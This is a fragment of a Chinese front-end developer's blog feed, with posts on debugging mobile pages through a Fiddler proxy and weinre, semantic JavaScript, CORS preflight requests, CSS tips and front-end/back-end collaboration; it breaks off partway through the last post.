        <content type="html"><![CDATA[<p>我们在移动端进行前端开发时，会遇到一个让人头痛但不得不面对的问题&mdash;&mdash;调试。</p><p>在 PC 机器上，我们有功能强大的 Chrome DevTools、Firebug，即便是老版本的 IE ，我们也可以安装微软提供的插件，对网页样式和请求信息轻松进行调试。但在手机、平板上，很多人就无招可施了，一个劲的 alert 查看调试信息。如果你已经厌倦了可爱又可恨的 alert 弹窗，请继续往下阅读。</p><h3>一、先说说调试的原理</h3><p>设备浏览器中输入一个 URL，它会向 URL 所在的 server 请求资源：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">+<span class="params">-------------</span>+         +<span class="params">---------------</span>+</span><br><span class="line">|    client   |<span class="params">--------</span>→|    Internet   |</span><br><span class="line">+<span class="params">-------------</span>+         +<span class="params">---------------</span>+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时，数据是从 client 和 目标 server 之间的隐秘交互，除非 server 端的代码是由我们自己控制，否则很难了解他们之间都做了什么信息传递。如果 server 传过来的代码存在 bug，此时我们就相当纠结了。比较常见的情景是，该 server 就是我们的测试机器，我们在测试机器上开发，通过一个移动设备 client 来实施调试代码，常用的调试方式就是修改 server 代码，再实时查看 client 的响应。</p><p>但是，问题来了。某天，Barret 发现 client 端页面显示有 bug，由于 client 请求的目标 server 是线上，不像平时的测试机器，我们可以随意修改代码然后查看效果，并且线上的代码都是经过压缩和打包了的，很难阅读，怎么办？</p><p>于是，我想到了使用代理：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+-------------+    \ /   +---------------+</span><br><span class="line">|<span class="string">    client   </span>|<span class="string">-----×---→</span>|<span class="string">    Internet   </span>|</span><br><span class="line">+-------------+    / \   +---------------+</span><br><span class="line">       |<span class="string">                         ↑</span></span><br><span class="line"><span class="string">       </span>|<span class="string">                         </span>|</span><br><span class="line">       |<span class="string">     +-------------+     </span>|</span><br><span class="line">       +----→|<span class="string">    proxy    </span>|<span class="string">-----+</span></span><br><span class="line"><span class="string">             +-------------+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>我们在 client 端做相应配置，让他的请求强制指向 proxy，然后 proxy 转发请求到目标 server，proxy 上的请求和响应都是透明的，通过篡改 client 到 proxy 的请求，或者篡改 server 到 proxy 的响应，就可以实时查看这些人为修改在 client 端的效果了。本文目的就是说明 proxy 是如何操作的。</p><h3>二、通过 Fiddler 代理</h3><p>windows 下著名的 http(s) 代理软件 fiddler 使用比较广泛，mac 下可以使用 charles 代理，由于使用人群相对偏少，本文就不细说，感兴趣的可以 PM 我。charles 是一个跨平台的软件，windows 下也可以使用，不过个人偏好 fiddler。OK，我们来看看 fiddler 是如何一步一步完成网络代理的。</p><p><strong>1. 配置客户端</strong></p><p>这里说的客户端包括手机、平板甚至电脑。一般的 android / IOS 设备都可以设置代理：</p><p>step 1. 当连接好网络之后（相信你在一个 wifi 环境下进行开发），点击右侧的箭头按钮，我使用的是 android 手机，IOS 也比较好找，在 设置&gt;Wi-Fi 中找到对应的网络，右侧有个圆圈包着的 i 图标，点击进入：</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282333111579295.jpg" alt="" width="289" height="511"></p><p>step 2.&nbsp;一般代理方式有两种，手动和自动，将其设置为手动，然后填写，你电脑的 IP（为啥呢？因为 proxy 是你的电脑，client 的请求要全部转发到你的电脑上，然后使用 fiddler 软件去分析/替换请求），windows 下使用 ipconfig 可以看到本机 IP，linux/unix 下使用 ifconfig 查看：</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282339113135798.jpg" alt="" width="452" height="296"></p><p><img src="https://images.cnitblog.com/blog/387325/201408/282333236261387.jpg" alt="" width="285" height="505"></p><p>step 3.&nbsp;设置端口，端口可以随意设置，但最好大于 3000，数值比较小的端口可能被系统占用了。</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282340576885734.jpg" alt=""></p><p>这里需要注意一点，由于 client 相对我们电脑的 fiddler 来说是一个远程设备，所以要在 Allow Remote Computers to Connert 选项上打上勾勾。</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282339362666508.jpg" alt=""></p><p>step 4.&nbsp;进入手机浏览器，输入网址：</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282343301106735.jpg" alt="" width="258" height="458"></p><p>step 5.&nbsp;然后把你的眼睛挪到电脑屏幕上看看 fiddler：</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282344162984759.jpg" alt=""></p><p>到这里，我相信你已经看明白了整个 proxy 的原理。至于 fiddler 如何替换包，如何修改包，如果调试，不是本文叙述的重点，下面演示一个简单的替换。</p><p><strong>2. 调试</strong></p><p>请求百度的页面，我们把百度的 logo 换成博客园的：</p><p>step 1. 在 AutoResponder 中添加一项：</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282352193137126.jpg" alt="" width="776" height="405"></p><p>step 2. 进入你的浏览器（UC下清空缓存，如果缓存中有百度图片，他会使用缓存，并不发出这个请求），打开百度页面：</p><p><img src="https://images.cnitblog.com/blog/387325/201408/282356507983855.jpg" alt="" width="284" height="506"></p><p>然后你就发现，貌似哪里有点不对~ 除此之外，你还可以将线上文件替换到本地，比如线上的 xyz-min.js 替换成本地的 xyz.js 然后修改 xyz.js 的内容，直接调试线上 bug，异常方便！</p><h3>三、其他工具</h3><p>有人会说，我没有实体机，那我建议你在电脑上安装虚拟机，android 和 IOS 的虚拟机都比较好安装。</p><p>有人会说，我电脑太卡，跑不动虚拟机，那我建议你就是用上述方式。</p><p>有人会说，.....，（如果没实体机也没虚拟机，那你开发个毛线呀）。</p><p>Fiddler 和 Charles 都是 HTTP(s) 层的抓包软件，如果你是 websocket 开发调试，建议使用 wireshark，网络七层协议，这个软件能抓除数据链路层之外的所有层信息，出于安全考虑，它抓到的包是不能篡改的。</p><p>还有一些比较好用的工具，如利用 pac 文件配置系统代理，weinre 调试等，这里简单介绍下 weinre：</p><div><h4>1. 安装</h4><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> –g weinre</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 打开</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weinre</span> -httpPort <span class="number">7999</span> -boundHost -<span class="literal">all</span>-</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>httpPort 监听端口</li><li>boundHost –all- 绑定主机</li></ul><h4>3. 说明都写在图片里头，相信聪明的你可以悟到</h4></div><p><img src="https://images.cnitblog.com/blog/387325/201408/290011110635771.png" alt="" width="675" height="710"></p><h3>四、小结</h3><p>移动端开发不比 PC 轻松，调试只是需要注意的一个小点，还有很多很多未知的东西等着我们去探索，本文也算是抛砖引玉，如果您有更好的移动端调试方案，希望可以分享出来，一起交流。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 移动端调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>评《别太听上司的话》</title>
      <link href="/blog/2014/08/29/be-patient/"/>
      <url>/blog/2014/08/29/be-patient/</url>
      
        <content type="html"><![CDATA[<p>今天早上逛博客园，看到了一篇吐槽的文章：<a href="http://www.cnblogs.com/beatless/p/3944101.html">别太听上司的话</a>，有些感触：</p><p>给你加任务的，可以称之为需求方。在需求方看来，无论你是前端开发还是后台开发，广义上讲，都是资源，有需求当然也是需要资源的。</p><p>每一个需求过来都应该进行评审，需求方不提，你自己也没有提出来，他们觉得加一点东西或者改一点东西是十分轻松的事情，因为他们不懂技术，可是你懂呀，你需要把排期和难点罗列出来，给出一个相对准确的项目时间，这有啥难度么？</p><p>能力强不等于无敌，有些人会说能力越强责任越重，你可以认为这是忽悠你的借口，不过这也是事实，当你的技术能力和业务能力持平之后，你的工资和职衔也就上去了。</p><p>你说一两年学到的东西还不如两个月的，显然，你指的是技术方面。想必楼主是一个沉醉于技术的人，但是在工作中，技术只是一方面，或许学会做人才是最重要的。</p><p>我也经常会遭遇楼主这样的经历，每每过来都是忍气吞声，但是每一次我都试着去坦然去面对，当然提高了自己跟人 PK 的能力。</p><p>所以，加油吧！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
            <tag> work </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>￥符号，少了一横</title>
      <link href="/blog/2014/08/29/dollar-in-different-face/"/>
      <url>/blog/2014/08/29/dollar-in-different-face/</url>
      
        <content type="html"><![CDATA[<p>跟钱有关的问题。</p><p>数值前加一个 ￥ 符号，可是视觉同学一定要使用两横的 dollar 符号。咋弄？</p><p>这个符号在不同字体下呈现的效果是不一样的，微软雅黑下是两横，不过显示的并不好看，正确的处理方式应该是：</p><pre><code>&lt;style&gt;i &#123;font-family:&quot;Microsoft Yahei&quot;;&#125;&lt;/style&gt;&lt;i&gt;&amp;yen;&lt;/i&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IE下title没有childNodes</title>
      <link href="/blog/2014/08/21/IE-bug-in-title-element/"/>
      <url>/blog/2014/08/21/IE-bug-in-title-element/</url>
      
        <content type="html"><![CDATA[<p><strong>问题：</strong></p><blockquote><p>IE 8下 document.getElementsByTagName(‘title’)[0].firstChild为毛是null啊 而document.getElementsByTagName(‘title’)[0].innerHTML却有值，给title赋值却报错。</p></blockquote><p>按照 w3c 的解释，title 元素下有且只有一个 text node，除 IE 外，其他浏览器都能正确打印 getTagName(“title”).item(0).childNodes &#x3D;&#x3D; 1; 而 IE 他不认为 title 元素有 childNode，你可以当他是没有实现规范的 bug。IE9+ 修复了这个问题。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IEbug </tag>
            
            <tag> firstChild </tag>
            
            <tag> childNodes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让你的JavaScript代码更加语义化</title>
      <link href="/blog/2014/08/20/cb-javascript-semantization/"/>
      <url>/blog/2014/08/20/cb-javascript-semantization/</url>
      
        <content type="html"><![CDATA[<p class="p1">语义化这个词在 HTML 中用的比较多，即根据内容的结构化选择合适的标签。其作用不容小觑：</p><ul class="ul1"><li class="li3">赋予标签含义，让代码结构更加清晰，虽然我们可以在标签上添加 class 来标识，但这种通过属性来表示本体的形式会显得不够直接，而且在一定程度上也有冗余。</li><li class="li3">优化搜索引擎（SEO），结构良好的网页对搜索引擎的亲和力是很高的，百度和 google 也给出了很多网页结构化的建议（规范），方便他们抓取网页。</li><li class="li3">利于设备解析，如盲人阅读器对页面的分析，目前淘宝很多网页都是支持盲人阅读的，这种体验上的优化得利于网页的良好结构和语义化表达。</li><li class="li3">便于开发者维护，在参加工作之前，很多程序员都是单人开发模式，单人开发无所谓代码结构，自己看得懂就差不多了，一旦走向工作岗位，会发现，以前的鄙习有点让自己捉襟见肘了。</li></ul><p class="p2">W3C Group 工作组在 web 规范上持续贡献，他们的目标也是期望整个互联网的发展态势稳定统一起来。不扯远了，回到本文需要阐述的重点：如何语义化 JavaScript 代码？</p><h3 class="p4"><strong>一、先看看那些不易读懂的 JavaScript 代码</strong></h3><p class="p2"><strong>1. 判断</strong></p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据类型判断</span></span><br><span class="line"><span class="keyword">if</span><span class="comment">(Object.prototype.toString.call(str)</span> === <span class="string">&quot;[object String]&quot;</span>)&#123;</span><br><span class="line">    <span class="comment">// doSomething();</span></span><br><span class="line">&#125;；</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件类型判断</span></span><br><span class="line"><span class="keyword">if</span><span class="comment">(/.*\.css(?=\?|$)</span>/.test<span class="comment">(\/path/to/main.css&quot;)</span>)&#123;</span><br><span class="line">    <span class="comment">// doSomething();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2"><strong>2. 清空一个队列</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Queue = [<span class="string">&quot;test1&quot;</span>, <span class="string">&quot;test2&quot;</span>, <span class="string">&quot;test3&quot;</span>];</span><br><span class="line"><span class="comment">// 常见方式</span></span><br><span class="line">Queue.<span class="built_in">length</span> = <span class="number">0</span>;</span><br><span class="line">Queue = [];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2"><strong>3. 注册一个变量</strong></p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册</span></span><br><span class="line">var <span class="attr">repos</span> <span class="operator">=</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;;</span></span><br><span class="line"></span><br><span class="line">repos[<span class="string">&quot;a&quot;</span>] = <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">   name:</span> <span class="string">&quot;a&quot;</span>,</span><br><span class="line"><span class="symbol">   content:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;;</span></span><br><span class="line"></span><br><span class="line">repos[<span class="string">&quot;b&quot;</span>] = <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">   name:</span> <span class="string">&quot;b&quot;</span>,</span><br><span class="line"><span class="symbol">   content:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2">上面几个例子倒不至于看不懂，程序都特别简单，第一个例子中，我们通过 Object 原型链上的 toString 方法来判断一个变量是否为 string 类型，以及使用正则来判断一个文件是不是 css 文件。代码写起来比较轻松，倘若我们同时需要判断多个对象是否为多个类型中的一种呢？再比如我们需要在一串代码中提取 require 依赖关系呢，是否应该思考下如何组织自己的代码？</p><p class="p2">在第二个例子中，将数组的长度设置为 0，或者使用空数组来重置这个变量，都是十分常见的方式，但目前的场景是清空一个队列，我们是否可以使用更加语义化的形式来呈现？比如我们只需要清空该队列的前五个和后三个 item 呢？</p><p class="p2">第三个例子中，变量的注册，把一堆注册放在一起，上面的形式确实也是一目了然，如果 a b c d 等都是分隔穿插在几百行代码之间呢？突然来个 repos["x"] 这样是否显得有些不太直观。</p><p class="p2">为了说明本文所倡导的思想，上面的几个解释都有些含糊和牵强，请往下看。</p><h3 class="p4"><strong>二、提高代码语义性</strong></h3><p class="p2">针对上述三个案例，用更加语义化的方式来呈现代码：</p><p class="p2"><strong>1. 语义化变量</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类型判断</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isType</span>(<span class="params">type</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">o</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(o) === <span class="string">&#x27;[object &#x27;</span> + type + <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isString = <span class="title function_">isType</span>(<span class="string">&quot;String&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> isObject = <span class="title function_">isType</span>(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> isArray = <span class="title function_">isType</span>(<span class="string">&quot;Array&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">isString</span>(<span class="string">&quot;I&#x27;m Barret Lee.&quot;</span>);</span><br><span class="line"><span class="title function_">isArray</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])；</span><br><span class="line"><span class="title function_">isObject</span>(&#123;&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2">我觉得不需要太多的解释，对比</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">if(Object.prototype.toString.call(str) <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="string">&quot;[object String]&quot;</span>)&#123;</span><br><span class="line">    // code here...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显得清新多了吧。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 提取常量</span></span><br><span class="line"><span class="keyword">var</span> isCss = <span class="regexp">/.*\.css(?=\?|$)/</span>;</span><br><span class="line">isCss.test(<span class="string">&quot;/path/to/main.css&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2">不管 isCss 这个正则代码有多长，当我们看到 isCss 这个单词就可以顾名思义。很多人写正则都不会将正则单独提取出来使用某个有意义的变量去存储，加注释还好，要是不加注释，后续开发者就只能硬着头皮看懂正则去理解代码的含义。</p><p class="p2">这样的处理，实际上是增加了代码量，不过从工程角度去审视，有助于提高开发效率以及代码的组织性。</p><p class="p2"><strong>2. 语义化行为</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Queue = [<span class="string">&quot;test1&quot;</span>, <span class="string">&quot;test2&quot;</span>, <span class="string">&quot;test3&quot;</span>];</span><br><span class="line">Queue.<span class="built_in">splice</span>(<span class="number">0</span>, Queue.<span class="built_in">length</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2">上面代码具有很强的语义性，从索引为 0 的地方开始，直到队列最后，删除 Queue 中所有的 item。这种写法的扩展性也更好：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Queue</span>.splice(<span class="number">2</span>, <span class="number">4</span>); // 删除从索引为 <span class="number">2</span>，往后的 <span class="number">4</span> 个元素</span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2">这只是个小例子，有些行为是需要很多代码组合处理的，如果没有很好的组合同一行为的代码，整个结构就显得十分涣散，不利于阅读。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册</span></span><br><span class="line"><span class="keyword">var</span> repos = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">   repos[o.name] = o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">register</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">  <span class="attr">content</span>: &#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p2">对比我们之前</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">repos[<span class="string">&quot;a&quot;</span>] = <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">   name:</span> <span class="string">&quot;a&quot;</span>,</span><br><span class="line"><span class="symbol">   content:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p class="p5"><span>语义化程度是不是有所提高~</span></p><h3 class="p4"><strong>三、小结</strong></h3><p class="p2">代码的优化，需要考虑的维度很多。但是代码的优化并不是减少代码量，有的时候我们需要增加代码来提高代码的可阅读性。</p><ul class="ul1"><li class="li3">正确标记变量</li><li class="li3">封装某个动作</li><li class="li3">注意函数的写法</li><li class="li3">不容易理解的东西，加注释</li></ul><p class="p2">本文为抛砖引玉，希望可以触发你对代码优化的敏感度的思考，写出一手别人竖拇指的代码~</p><p class="p2">&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POST请求失败，变成options请求</title>
      <link href="/blog/2014/08/19/post-method-change-to-options/"/>
      <url>/blog/2014/08/19/post-method-change-to-options/</url>
      
        <content type="html"><![CDATA[<p><strong>问题：</strong></p><blockquote><p>我的 XMLHttpRequest 跨域 POST ，怎么请求方式自动由POST变成OPTIONS了呢？</p></blockquote><p>浏览器为了安全起见，会先发送一个 options 请求，确保请求发送是安全的，一般 POST DELETE PUT 等请求都会修改服务器资源，所以浏览器会先发一个请求，问问服务器是否会正确（允许）请求。</p><p>出现 OPTIONS 的情况一般为：</p><ol><li>非 GET | POST 请求</li><li>POST 请求的 content-type 不是常规的那三个</li><li>POST 请求的 payload 为 text&#x2F;xml</li></ol><blockquote><p>我的请求倒是很常规啊，不存在上面3条的问题</p></blockquote><p>跨域了呀，浏览器也会为了试探服务器是否会接受请求，先发送一个 options 请求。即便是服务器允许程序跨域访问，若不支持 options 请求，请求也会死掉。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨域 </tag>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绝对定位，margin:0 auto，让元素竖直居中</title>
      <link href="/blog/2014/08/07/position-and-margin/"/>
      <url>/blog/2014/08/07/position-and-margin/</url>
      
        <content type="html"><![CDATA[<p><strong>问题：</strong></p><pre><code>div &#123;    margin: auto;    position: absolute;    top: 0;    left: 0;    right: 0    bottom: 0;    width: 100px;    height: 100px;&#125;</code></pre><p>是如何自适应的。</p><p>原因是，绝对定位的布局取决于三个因素，一个是元素的位置，一个是元素的尺寸，一个是元素的margin值。</p><p>没有设置尺寸和 margin 的元素会自适应剩余空间，位置固定则分配尺寸，尺寸固定边会分配 margin，都是自适应的。</p><p>IE7- 的渲染方式不同，渲染规则也不一样，他不会让定位元素去自适应。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Object + Array</title>
      <link href="/blog/2014/08/07/%7B%7D+%5B%5D/"/>
      <url>/blog/2014/08/07/%7B%7D+%5B%5D/</url>
      
        <content type="html"><![CDATA[<p><strong>问题：</strong></p><pre><code>&#123;&#125; + []</code></pre><ul><li>{} + [] 结果应该是 0</li><li>console.log({} + []) 结果应该是 object object</li></ul><p>两个 {} 的语义不一样,前者被解析成 {}; +[]; 后者 {} 为对象.</p><ul><li><p>操作符，针对非 Number 的处理内部调用 ToPrimary() 函数, {} 和 [] 都执行了自身的 toString 函数</p><p>  ({} + [])<br>  ({}) + []</p></li></ul><p>这些表达式中，{}都被当做对象来解析，而不是 作用块</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈谈前后端的分工协作</title>
      <link href="/blog/2014/08/03/cb-interface-in-development/"/>
      <url>/blog/2014/08/03/cb-interface-in-development/</url>
      
        <content type="html"><![CDATA[<p>前后端分工协作是一个老生常谈的大话题，很多公司都在尝试用工程化的方式去提升前后端之间交流的效率，降低沟通成本，并且也开发了大量的工具。但是几乎没有一种方式是令双方都很满意的。事实上，也不可能让所有人都满意。根本原因还是前后端之间的交集不够大，交流的核心往往只限于接口及接口往外扩散的一部分。这也是为什么很多公司在招聘的时候希望前端人员熟练掌握一门后台语言，后端同学了解前端的相关知识。</p><h3>一、开发流程</h3><p>前端切完图，处理好接口信息，接着就是把静态demo交给后台去拼接，这是一般的流程。这种流程存在很多的缺陷。</p><ul><li>后端同学对文件进行拆分拼接的时候，由于对前端知识不熟悉，可能会搞出一堆bug，到最后又需要前端同学帮助分析原因，而前端同学又不是特别了解后端使用的模板，造成尴尬的局面。</li><li>如果前端没有使用统一化的文件夹结构，并且静态资源（如图片，css，js等）没有剥离出来放到 CDN，而是使用相对路径去引用，当后端同学需要对静态资源作相关配置时，又得修改各个link，script标签的src属性，容易出错。</li><li>接口问题<ol><li>后端数据没有准备好，前端需要自己模拟一套，成本高，如果后期接口有改变，自己模拟的那套数据又不行了。</li><li>后端数据已经开发好，接口也准备好了，本地需要代理线上数据进行测试。这里有两个费神的地方，一是需要代理，否则可能跨域，二是接口信息如果改动，后期接你项目的人需要改你的代码，麻烦。</li></ol></li><li>不方便控制输出。为了让首屏加载速度快一点，我们期望后端先吐出一点数据，剩下的才去 ajax 渲染，但让后端吐出多少数据，我们不好控。</li></ul><p>当然，存在的问题远不止上面枚举的这些，这种传统的方式实在是不酷（Kimi 附身^_^）。还有一种开发流程，SPA（single page application），前后端职责相当清晰，后端给我接口，我全部用 ajax 异步请求，这种方式，在现代浏览器中可以使用 PJAX 稍微提高体验，Facebook 早在三四年前对这种 SPA 的模式提出了一套解决方案，quickling+bigpipe，解决了 SEO 以及数据吐出过慢的问题。他的缺点也是十分明显的：</p><ul><li>页面太重，前端渲染工作量也大</li><li>首屏还是慢</li><li>前后端模板复用不了</li><li>SEO 依然很狗血（quickling 架构成本高）</li><li>history 管理麻烦</li></ul><p>问题多的已经是无力吐槽了，当然他依然有自己的优势，咱们也不能一票否决。</p><p>针对上面看到的问题，现在也有一些团队在尝试前后端之间加一个中间层（比如淘宝UED的 MidWay ）。这个中间层由前端来控制。</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">+<span class="params">----------------</span>+</span><br><span class="line">|       F2E      |</span><br><span class="line">+<span class="params">---</span>↑<span class="params">--------</span>↑<span class="params">---</span>+</span><br><span class="line">    |        |</span><br><span class="line">+<span class="params">---</span>↓<span class="params">--------</span>↓<span class="params">---</span>+</span><br><span class="line">|     Middle     |</span><br><span class="line">+<span class="params">---</span>↑<span class="params">--------</span>↑<span class="params">---</span>+</span><br><span class="line">    |        |</span><br><span class="line">+<span class="params">---</span>↓<span class="params">--------</span>↓<span class="params">---</span>+</span><br><span class="line">|       R2E      |</span><br><span class="line">+<span class="params">----------------</span>+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中间层的作用就是为了更好的控制数据的输出，如果用MVC模型去分析这个接口，R2E（后端）只负责 M（数据） 这部分，Middle（中间层）处理数据的呈现（包括 V 和 C）。淘宝UED有很多类似的文章，这里不赘述。</p><h3>二、核心问题</h3><p>上面提出了在业务中看到的常见的三种模式，问题的核心就是数据交给谁去处理。数据交给后台处理，这是模式一，数据交给前端处理，这是模式二，数据交给前端分层处理，这是模式三。三种模式没有优劣之分，其使用还是得看具体场景。</p><p>既然都是数据的问题，数据从哪里来？这个问题又回到了接口。</p><ul><li>接口文档由谁来撰写和维护？</li><li>接口信息的改动如何向前后端传递？</li><li>如何根据接口规范拿到前后端可用的测试数据？</li><li>使用哪种接口？JSON，JSONP？</li><li>JSONP 的安全性问题如何处理？</li></ul><p>这一系列的问题一直困扰着奋战在前线的前端工程师和后端开发者。淘宝团队做了两套接口文档的维护工具，IMS以及DIP，不知道有没有对外开放，两个东西都是基于 JSON Schema 的一个尝试，各有优劣。JSON Schema 是对 JSON 的一个规范，类似我们在数据库中创建表一样，对每个字段做一些限制，这里也是一样的原理，可以对字段进行描述，设置类型，限制字段属性等。</p><p>接口文档这个事情，使用 JSON Schema 可以自动化生产，所以只需编写 JSON Schema 而不存在维护问题，在写好的 Schema 中多加些限制性的参数，我们就可以直接根据 Schema 生成 mock（测试） 数据。</p><p>mock 数据的外部调用，这倒是很好处理：</p><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">typeof</span> <span class="variable">callback</span> === <span class="string">&quot;function&quot;</span> &amp;&amp; <span class="function"><span class="title">callback</span>(&#123;</span></span><br><span class="line"><span class="function">   <span class="variable">json</span>: <span class="string">&quot;jsonContent&quot;</span></span></span><br><span class="line"><span class="function">&#125;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在请求的参数中加入 callback 参数，如 /mock/hashString?cb=callback，一般的 io(ajax) 库都对异步数据获取做了封装，我们在测试的时候使用 jsonp，回头上线，将 dataType 改成 json 就行了。</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">IO(<span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">  url:</span> <span class="string">&quot;http://barretlee.com&quot;</span>,</span><br><span class="line"><span class="symbol">  dataType:</span> <span class="string">&quot;jsonp&quot;</span>, <span class="comment">//json</span></span><br><span class="line"><span class="symbol">  success:</span> function()<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里略微麻烦的是 POST 方法，jsonp 只能使用 get 方式插入 script 节点去请求数据，但是 POST，只能呵呵了。</p><p>这里的处理也有多重方式可以参考：</p><ul><li>修改 Hosts，让 mock 的域名指向开发域名</li><li>mock 设置 header 响应头，Access-Allow-Origin-Control</li></ul><p>对于如何拿到跨域的接口信息，我也给出几个参考方案：</p><ul><li>fiddler 替换包，好像是支持正则的，感兴趣的可以研究下（求分享研究结果，因为我没找到正则的设置位置）</li><li>使用 HTTPX 或者其他代理工具，原理和 fiddler 类似，不过可视化效果（体验）要好很多，毕竟人家是专门做代理用的。</li><li>自己写一段脚本代理，也就是本地开一个代理服务器，这里需要考虑端口的占用问题。其实我不推荐监听端口，一个比较不错的方案是本地请求全部指向一个脚本文件，然后脚本转发URL，如：<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">原始请求：http:<span class="regexp">//</span>barretlee.com<span class="regexp">/api/</span>test.json</span><br><span class="line">在ajax请求的时候：</span><br><span 